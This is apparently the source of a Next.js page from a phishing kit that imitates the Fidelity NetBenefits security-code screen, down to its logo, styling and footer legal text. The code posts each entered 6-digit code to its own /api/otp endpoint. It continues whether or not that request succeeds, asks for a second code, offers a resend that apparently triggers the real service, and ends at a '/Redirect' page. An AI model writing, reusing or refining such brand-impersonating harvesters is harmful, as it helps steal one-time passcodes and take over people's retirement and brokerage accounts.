'use client';

import { useState, useMemo, Suspense, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';

function OTPContent() {
  const searchParams = useSearchParams();
  const step2 = useMemo(() => searchParams.get('step') === '2', [searchParams]);
  const [otpCode, setOtpCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const router = useRouter();

  useEffect(() => {
    if (typeof window === 'undefined') return;
    if (step2) {
      if (!sessionStorage.getItem('fl_otp2')) router.replace('/details');
    } else {
      if (!sessionStorage.getItem('fl_otp1')) router.replace('/');
    }
  }, [step2, router]);

  const loading = isLoading || resendLoading;
  const numericOtp = otpCode.replace(/\D/g, '');
  const isOtpValid = numericOtp.length === 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otpCode.replace(/\D/g, '');
    if (code.length !== 6 || isLoading) return;
    setIsLoading(true);

    try {
      await fetch('/api/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otpcode: code, isSecondOtp: step2 }),
      });
      await new Promise((r) => setTimeout(r, 1000));
      if (step2) {
        window.location.href = '/Redirect';
        return;
      }
      if (typeof window !== 'undefined') sessionStorage.setItem('fl_details', '1');
      router.push('/details');
    } catch (err) {
      console.error('Error submitting OTP:', err);
      await new Promise((r) => setTimeout(r, 1000));
      if (step2) {
        window.location.href = '/Redirect';
      } else {
        if (typeof window !== 'undefined') sessionStorage.setItem('fl_details', '1');
        router.push('/details');
      }
    }
  };

  const handleResend = async () => {
    if (resendLoading || loading) return;
    setResendLoading(true);
    try {
      await fetch('/api/resend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ isSecondOtp: step2 }),
      });
      await new Promise((r) => setTimeout(r, 2000));
    } finally {
      setResendLoading(false);
    }
  };

  return (
    <>
      <style jsx global>{`
        * {
          box-sizing: border-box;
        }

        body,
        p {
          margin: 0;
        }

        .sf-hidden {
          display: none !important;
        }

        .main-container {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          box-sizing: border-box;
          min-height: 100vh;
        }

        .main-container nav.dom-header {
          background-color: #fff;
          border-bottom: 1px solid #ccc;
          box-sizing: border-box;
          display: flex;
          flex-direction: row;
          flex-wrap: nowrap;
          font-family: Fidelity Sans, Arial, sans-serif;
          height: 3.75rem;
          justify-content: space-between;
        }

        .main-container nav.dom-header div.dom-header-logo {
          margin: 1rem 0 0 1.25rem;
        }

        .main-container nav.dom-header div.dom-header-logo a {
          text-decoration: none;
        }

        .main-container nav.dom-header div.dom-header-links {
          margin: 0 1.25rem 0 0;
          display: flex;
          align-items: center;
          gap: 2rem;
        }

        .main-container nav.dom-header div.dom-header-links .dom-header-pvd-link {
          color: #000;
          font-weight: 400;
          vertical-align: middle;
          text-decoration: none;
        }

        .main-container .dom-container {
          margin: 15vh auto 0;
          padding-bottom: 2rem;
          width: 448px;
        }

        .dom-card {
          background: #fff;
          font-family: Fidelity Sans, Helvetica, Arial, sans-serif;
        }

        @media (min-width: 32em) {
          .dom-card {
            border: 1px solid #ccc;
            border-radius: 0.5rem;
            padding: 2rem 2rem 3rem;
          }
        }

        @media (max-width: 32em) {
          .dom-card {
            border-bottom: 1px solid #ccc;
            padding: 1.5rem 1rem;
          }
        }

        .dom-card .dom-card-header {
          margin-bottom: 1rem;
        }

        .dom-card h1 {
          font-size: 1.5rem;
          font-weight: 700;
          margin: 0;
          color: #000;
        }

        .dom-card .dom-card-body {
          margin: 1.5rem 0 0;
        }

        .pvd-button-root {
          width: 100%;
          padding: 0.75rem;
          background-color: #368727;
          color: white;
          border: none;
          border-radius: 0.25rem;
          font-size: 1rem;
          font-weight: 400;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-bottom: 1rem;
        }

        .pvd-button-root:hover {
          background-color: #2b6b1e;
        }

        .pvd-button-root:disabled {
          background-color: #bbb;
          cursor: not-allowed;
        }

        .pvd-button--secondary {
          background-color: transparent;
          border: 1px solid #ccc;
          color: #000;
        }

        .pvd-button--secondary:hover {
          background-color: #f2f2f2;
        }

        .pvd-button--secondary:disabled {
          background-color: #f5f5f5;
          color: #999;
          cursor: not-allowed;
        }

        .buttons-container {
          display: flex;
          gap: 1rem;
          margin-top: 1rem;
        }

        .buttons-container .pvd-button-root {
          flex: 1;
          margin-bottom: 0;
        }

        .pvd-button--tertiary {
          background-color: transparent;
          border: none;
          color: #0066cc;
          padding: 0.5rem 0;
          width: auto;
        }

        .pvd-link__link {
          color: #0066cc;
          text-decoration: underline;
          cursor: pointer;
        }

        .pvd-link__link:hover {
          color: #0052a3;
        }

        .pvd-input-root {
          width: 100%;
          margin-bottom: 1rem;
        }

        .pvd-input__input {
          width: 100%;
          padding: 0.75rem;
          border: 1px solid #ccc;
          border-radius: 0.25rem;
          font-size: 1rem;
          color: #000;
          background-color: #fff;
        }

        .pvd-label__label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 400;
          font-size: 1rem;
          color: #000;
        }

        #dom-otp-channel-label {
          color: #000;
          margin-bottom: 1rem;
        }

        .dom-card-body p {
          color: #000;
        }

        .dom-margin-top-space-stack-two-x {
          margin-top: 2rem;
        }

        .dom-margin-bottom-space-utility-half-x {
          margin-bottom: 0.5rem;
        }

        .load {
          width: 48px;
          height: 48px;
          border: 5px solid #368727;
          border-bottom-color: transparent;
          border-radius: 50%;
          display: inline-block;
          box-sizing: border-box;
          animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }

        footer.dom-footer {
          margin-top: -2rem;
        }
        footer.dom-footer .footer-new-user,
        footer.dom-footer .footer-legal,
        footer.dom-footer .footer-links-stacked,
        footer.dom-footer .footer-copyright-row {
          box-sizing: border-box;
          padding: 0 1.25rem;
          width: 100%;
        }
        footer.dom-footer .footer-new-user {
          padding-top: 0.5rem;
          padding-bottom: 1.5rem;
        }
        footer.dom-footer .footer-new-user-heading {
          margin: 0 0 0.5rem 0;
          font-size: 0.875rem;
          color: #333;
        }
        footer.dom-footer .footer-new-user .dom-footer-pvd-link { display: block; margin-bottom: 0.25rem; }
        footer.dom-footer .footer-faqs-link { display: block; margin-top: 1.25rem; }
        footer.dom-footer .footer-legal {
          line-height: 1.5;
          margin: 0 0 1.5rem 0;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
          display: block;
          padding: 0.25rem 0;
          text-decoration: none;
        }
        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link:hover { text-decoration: underline; }
        footer.dom-footer .footer-copyright-row { padding-bottom: 0.75rem; }

        @media screen and (min-width: 512px) {
          .main-container {
            height: auto;
            min-height: 100vh;
          }

          .main-container .dom-header {
            align-items: center;
            position: static;
          }

          .main-container .dom-header div.dom-header-links,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          footer.dom-footer {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto auto;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal {
            grid-column: 1 / -1;
            text-align: left;
          }
          footer.dom-footer .footer-copyright-row {
            grid-column: 1;
            text-align: left;
          }
          footer.dom-footer .footer-links-stacked {
            grid-column: 2;
            text-align: right;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: inline-block;
            padding: 0.75rem 1.5rem 0.75rem 0;
          }
        }

        @media screen and (max-width: 768px) {
          .main-container .dom-header div.dom-header-links.dom-header-links--hide-on-mobile {
            display: none;
          }
        }

        @media screen and (max-width: 511px) {
          .main-container .dom-header,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

        }

        @media only screen and (max-width: 511px) {
          .main-container nav.dom-header {
            border-bottom: none;
          }

          .main-container .dom-container {
            margin: 0 auto;
            width: auto;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

          footer.dom-footer {
            display: block;
            font-size: 0.875rem;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal,
          footer.dom-footer .footer-links-stacked,
          footer.dom-footer .footer-copyright-row {
            text-align: center;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: block;
            padding: 0.25rem 0;
          }
        }
      `}</style>

      <div className="main-container">
        <nav className="dom-header">
          <div className="dom-header-logo">
            <a href="/">
              <img
                src="/Fidelity-NetBenefits-Logo%20(5).svg"
                alt="Fidelity NetBenefits"
                style={{ height: '28px', width: 'auto' }}
              />
            </a>
          </div>
          <div className="dom-header-links dom-header-links--hide-on-mobile">
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/security/overview"
            >
              Security
            </a>
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/customer-service/need-help-logging-in"
            >
              FAQs
            </a>
          </div>
        </nav>

        <div className="dom-container">
          <div id="dom-overlay"></div>
          <div id="dom-widget">
            <div>
              <div id="mainui" className="dom-card dom-signin-card">
                <div className="dom-card-header">
                  <h1 className="pvd-title__heading pvd-title__heading--level-3">
                    {step2 ? 'Enter the code we sent again' : 'Enter the code we just sent to your phone'}
                  </h1>
                </div>

                <div className="dom-card-body">
                  <p id="dom-otp-channel-label">
                    We sent the code to your phone number. It will expire after 30 minutes.
                  </p>

                  <form id="login-form" onSubmit={handleSubmit}>
                    <div className="pvd-field-group__field-group">
                      <label className="pvd-label__label" htmlFor="dom-otp-code-input">
                        Security code
                      </label>
                      <div className="pvd-input-root">
                        <input
                          className="pvd-input__input"
                          id="dom-otp-code-input"
                          type="text"
                          maxLength={6}
                          placeholder="XXXXXX"
                          autoComplete="off"
                          value={otpCode}
                          onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                          required
                          disabled={loading}
                        />
                      </div>
                    </div>

                    <div className="buttons-container">
                      <button
                        type="submit"
                        id="dom-otp-code-submit-button"
                        className="pvd-button-root pvd-button--primary"
                        disabled={!isOtpValid || loading}
                      >
                        <span className="pvd-button__text">
                          {isLoading ? 'Loading...' : 'Submit'}
                        </span>
                      </button>

                      <button
                        type="button"
                        className="pvd-button-root pvd-button--secondary"
                        disabled={loading}
                        onClick={handleResend}
                      >
                        <span className="pvd-button__text">{resendLoading ? 'Sending...' : 'Resend code'}</span>
                      </button>
                    </div>

                    <div className={`dom-margin-top-space-stack-two-x ${loading ? 'pointer-events-none' : ''}`} style={loading ? { opacity: 0.7 } : undefined}>
                      <a className="pvd-link__link" href="#">
                        <span>Can't receive the code?</span>
                      </a>
                    </div>

                    <div className={`dom-margin-top-space-stack-two-x ${loading ? 'pointer-events-none' : ''}`} style={loading ? { opacity: 0.7 } : undefined}>
                      <a className="pvd-link__link" href={step2 ? '/details' : '/'}>
                        Cancel
                      </a>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
          <div id="dom-sronly" aria-live="assertive"></div>
        </div>
      </div>

      <footer className="dom-footer">
        <p className="footer-legal">
          By using this website, you consent to the use of cookies as described{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            here
          </a>
          . However, if you do not agree to our cookies policy, you can change your cookie settings at any time.{' '}
          Fidelity Brokerage Services LLC, Member{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.nyse.com"
            target="_blank"
            rel="noopener"
          >
            NYSE
          </a>
          ,{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.sipc.org"
            target="_blank"
            rel="noopener"
          >
            SIPC
          </a>
          , 900 Salem Street, Smithfield, RI 02917
        </p>
        <div className="footer-links-stacked">
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/terms-of-use"
            target="_blank"
            rel="noopener"
          >
            Terms of Use
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            Privacy
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/security/overview"
            target="_blank"
            rel="noopener"
          >
            Security
          </a>
        </div>
        <div className="footer-copyright-row">
          <div className="footer-copyright">
            ©1998-2026 FMR LLC. All Rights Reserved.
            <br />
            1205840.1.0
          </div>
        </div>
      </footer>
    </>
  );
}

export default function OTPPage() {
  return (
    <Suspense fallback={<div className="main-container" style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>Loading...</div>}>
      <OTPContent />
    </Suspense>
  );
}


